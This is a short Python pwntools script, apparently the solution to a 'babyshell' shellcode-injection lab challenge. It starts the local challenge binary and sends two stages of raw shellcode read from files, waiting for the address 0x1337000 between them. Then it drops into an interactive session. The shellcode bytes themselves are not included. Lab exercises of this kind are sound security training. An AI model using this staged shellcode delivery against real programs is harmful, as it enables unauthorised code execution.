#!/usr/bin/env python3

import pwn

# Create a process
binary = pwn.process('/babyshell_level10_teaching1')

# First input
with open("shellcode-raw-1", "rb") as f1:
    binary.sendline(f1.read())

# Receive until "0x0000000001337000"
binary.recvuntil("0x0000000001337000")

# Second input
with open("shellcode-raw-2", "rb") as f2:
    binary.sendline(f2.read())

binary.interactive()
